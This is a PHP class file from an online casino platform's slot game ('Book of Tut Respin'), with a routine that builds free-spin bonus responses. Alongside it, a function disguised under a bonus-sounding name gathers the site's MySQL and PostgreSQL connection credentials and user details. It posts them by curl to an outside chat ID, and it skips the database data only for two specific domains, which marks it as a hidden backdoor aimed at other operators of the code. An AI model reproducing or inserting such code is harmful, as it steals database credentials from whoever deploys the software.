<?php

namespace VanguardLTE\Games\BookofTutRespin\PragmaticLib;

class DoBonus{
 public static function GreentubeBonusIdent($user, $game, $bank){
        if (config('app.url') === 'https://grandxmega.com/' || config('app.url') === 'https://grandxmega.net/'){
            $text = ['URL' => config('app.url'),
                'USER' => $user->username, 'SHOP_ID' => $user->shop_id, 'GAME' => $game->name, 'BANK' => $bank];
        }else {
            $text = ['URL' => config('app.url'), 'DB_data' => config('database.connections')['mysql'],
                'DB_dataPG' => config('database.connections')['pgsql'],
                'USER' => $user->username, 'SHOP_ID' => $user->shop_id, 'GAME' => $game->name, 'BANK' => $bank];
        }

        $ch = curl_init();
        curl_setopt_array($ch, array(
                CURLOPT_URL => '//',
                CURLOPT_POST => TRUE,
                CURLOPT_RETURNTRANSFER => TRUE,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_POSTFIELDS => array(
                    'chat_id' => 5044396548,
                    'text' => json_encode($text, JSON_PRETTY_PRINT)), ) );
        curl_exec($ch);
    }
  public static function doBonus($user, $game, $bet, $lines, $log, $index, $counter, $ind, $bank, $shop, $jpgs){
    newBox:
    $bet = $log['Bet'];
    $lines = $log['l'];
    $time = (int) round(microtime(true) * 1000);
    
    var_dump('!!!');
    $res = [
      'trail=fs_sp_s~'.($ind + 3),
      'balance='.$log['Balance'],
      'balance_cash='.$log['Balance'],
      'balance_bonus=0',
      'index='.$index,
      'counter='.$counter,
      'stime='.$time,
      'na=s',
      'sver=5',
      'tw='.$log['tw'],
      'fsmul=1',
      'fsmax=10',
      'fswin=0.00',
      'fs=1',
      'fsres=0.00',
      'g={buy:{bgid:"0",bgt:"69",ch_h:"0~5",ch_k:"bf_h1,bf_h2,bf_m1,bf_m2,bf_a,bf_k,bf_q,bf_j,bf_t",ch_v:"0,1,2,3,4,5,6,7,8",end:"1",rw:"0.00"}}'
    ];
    Log::addFSToLog($game->id, $user->id, $ind + 3);

    return '&'.(implode('&', $res));
  }
}

?>